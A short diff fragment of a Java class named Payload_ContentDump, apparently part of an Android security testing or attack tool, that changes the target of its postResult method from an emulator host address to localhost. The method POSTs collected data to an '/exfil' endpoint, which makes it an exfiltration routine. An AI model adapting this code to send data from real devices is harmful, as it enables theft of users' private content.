@@ -37,7 +37,7 @@ public class Payload_ContentDump {
 
     private void postResult(String data) {
         try {
-            java.net.URL url = new java.net.URL("https://10.0.2.2:5000/exfil");
+            java.net.URL url = new java.net.URL("https://127.0.0.1:5000/exfil");
             java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setDoOutput(true);
